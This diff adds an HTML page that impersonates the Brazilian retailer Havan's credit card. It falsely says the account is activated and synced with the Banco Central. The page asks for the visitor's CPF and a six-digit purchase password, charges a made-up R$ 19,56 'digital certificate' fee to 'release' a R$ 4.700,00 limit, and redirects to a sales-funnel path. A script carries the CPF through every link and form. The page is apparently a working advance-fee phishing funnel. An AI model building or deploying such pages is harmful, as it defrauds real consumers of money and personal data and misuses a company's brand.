@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Havan Card - Assinatura Digital</title>
+    <link rel="stylesheet" href="assinatura-styles.css">
+    <style>
+        .final-step-badge {
+            background: #2ecc71;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .signature-box {
+            border: 2px dashed #3498db;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            background: #ebf5fb;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-container">
+            <div class="havan-logo">
+                <div class="logo-circle">
+                    <span class="logo-text">H</span>
+                </div>
+                <h2>HAVAN</h2>
+            </div>
+            
+            <div class="loading-content">
+                <h3 id="loadingTitle">Conta Ativada com Sucesso!</h3>
+                <p id="loadingSubtitle">Sincronizando dados com o Banco Central...</p>
+                
+                <div class="progress-steps">
+                    <div class="step completed">
+                        <div class="step-icon"><i class="fas fa-check-circle"></i></div>
+                        <div class="step-text">
+                            <span class="step-title">Conta Digital</span>
+                            <span class="step-status">Ativada ✓</span>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step3">
+                        <div class="step-icon"><i class="fas fa-file-signature"></i></div>
+                        <div class="step-text">
+                            <span class="step-title">Assinatura do Contrato</span>
+                            <span class="step-status" id="status3">Processando...</span>
+                        </div>
+                        <div class="step-loader" id="loader3">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="error-message" id="errorMessage" style="display: none; flex-direction: column; align-items: center;">
+                    <div class="error-icon"><i class="fas fa-file-contract"></i></div>
+                    <h4>Assinatura Digital Pendente</h4>
+                    <p>Falta apenas um passo para você começar a usar seu limite.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Screen (Opcional, mantido para lógica do script) -->
+    <div id="loginScreen" class="login-screen" style="display: none;">
+        <div class="login-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo"><span>H</span></div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+                <div class="header-subtitle">Validação de Identidade</div>
+            </div>
+            <div class="login-content">
+                <div class="alert-box">
+                    <div class="alert-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div class="alert-text">
+                        <h3>Segurança Reforçada</h3>
+                        <p>Confirme seu CPF para acessar o contrato de adesão do seu novo cartão.</p>
+                    </div>
+                </div>
+                <div class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <label for="cpf">Confirme seu CPF</label>
+                        <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                    </div>
+                    <button class="login-btn" onclick="validateCPF()">ACESSAR CONTRATO</button>
+                </div>
+                <div class="password-form" id="passwordForm" style="display: none;">
+                    <h4>Crie sua Senha de Compras</h4>
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Senha de 6 dígitos">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="confirmPassword" placeholder="Confirme a senha">
+                    </div>
+                    <button class="login-btn" onclick="validatePassword()">DEFINIR SENHA E CONTINUAR</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Signature Screen -->
+    <div id="signatureScreen" class="signature-screen" style="display: none;">
+        <div class="signature-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo"><span>H</span></div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+            </div>
+            
+            <div class="signature-content">
+                <div style="text-align: center;">
+                    <span class="final-step-badge">PASSO FINAL: FORMALIZAÇÃO</span>
+                    <h2 style="color: #1a237e; margin-bottom: 15px;">Assinatura Digital do Contrato</h2>
+                    <p style="color: #666;">Para que seu limite de <strong>R$ 4.700,00</strong> seja liberado para compras e saques, é obrigatória a emissão do Certificado Digital de Assinatura.</p>
+                </div>
+
+                <div class="signature-box">
+                    <h4 style="color: #2980b9; margin-bottom: 10px;"><i class="fas fa-certificate"></i> Certificação ICP-Brasil</h4>
+                    <p style="font-size: 14px; color: #34495e;">Este processo garante a validade jurídica do seu contrato sem que você precise ir até uma loja física ou cartório.</p>
+                </div>
+                
+                <div class="fee-section">
+                    <div class="fee-box">
+                        <span class="fee-label">Taxa de Emissão Digital:</span>
+                        <span class="fee-value">R$ 19,56</span>
+                    </div>
+                    <p class="fee-note">Custo único de processamento do certificado digital</p>
+                </div>
+                
+                <div class="benefits-section">
+                    <h4 style="color: #1a237e; margin-bottom: 15px;">O que acontece após assinar?</h4>
+                    <div class="benefits-list">
+                        <div class="benefit">
+                            <i class="fas fa-check-circle"></i>
+                            <span><strong>Limite Disponível:</strong> Saldo liberado no App em até 30 minutos.</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check-circle"></i>
+                            <span><strong>Cartão Virtual:</strong> Gerado na hora para compras online.</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check-circle"></i>
+                            <span><strong>Seguro Proteção:</strong> Sua conta protegida contra fraudes.</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="signature-btn" onclick="window.location.href='/funil/pos/up2check/'+window.location.search">
+                    <i class="fas fa-pen-nib"></i>
+                    ASSINAR DIGITALMENTE E LIBERAR SALDO
+                </button>
+                
+                <p style="text-align: center; font-size: 12px; color: #999; margin-top: 20px;">
+                    <i class="fas fa-lock"></i> Ambiente seguro certificado pela Havan S.A.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script defer src="assinatura-script.js"></script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid') {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
